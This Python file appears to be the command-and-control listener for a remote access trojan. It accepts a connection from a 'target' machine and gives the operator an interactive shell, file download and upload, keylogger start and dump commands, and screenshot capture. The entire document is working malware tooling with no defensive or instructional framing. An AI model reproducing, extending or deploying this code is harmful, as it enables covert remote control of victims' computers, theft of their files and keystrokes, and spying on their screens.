import socket
import json
import os

# Function to send data reliably
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

# Function to receive data reliably
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to upload files
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

# Function to download files
def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

# Function to receive a screenshot
def receive_screenshot(file_name):
    f = open(file_name, 'wb')
    target.settimeout(3)
    while True:
        try:
            chunk = target.recv(1024)
            if not chunk:
                break
            f.write(chunk)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()

# Function to handle communication with the target
def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command == 'keylog_start':
            reliable_send(command)
        elif command == 'keylog_dump':
            reliable_send(command)
            result = reliable_recv()
            print(result)
        elif command == 'screenshot':
            receive_screenshot('screenshot.png')
            print("[+] Screenshot saved as screenshot.png")
        else:
            result = reliable_recv()
            print(result)

# Setup server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.91', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
